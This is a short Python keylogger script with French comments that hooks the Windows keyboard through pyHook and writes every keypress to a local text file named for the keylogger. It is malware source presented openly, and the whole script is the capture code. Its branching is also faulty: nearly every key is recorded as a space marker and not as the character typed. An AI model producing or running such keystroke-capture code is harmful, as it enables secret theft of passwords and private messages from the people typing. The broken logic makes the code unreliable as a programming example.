# coding: utf-8
import pythoncom, pyHook

def keypressed(event):
    global store

    if event.Ascii == 13:
        keys=' <Entrée> '
    elif event.Ascii:
        keys=' < Espace > '
    else: 
        keys=chr(event.Ascii)
    
    store=store+keys
    
    f=open('fichier_keylogger.txt','w')
    f.write(store)
    f.close()

    return True

store=''
hookman = pyHook.HookManager() # ou vrir un hook
hookman.KeyDown = keypressed # dans le cas ou on presse un bouton on fait 
                               # à la fonction keypressed et on stock 
                               # la valeur dans event
hookman.HookKeyboard() # pour qu'il reste acrocher au clavier
pythoncom.PumpMessages() # laisse le programe en exécution 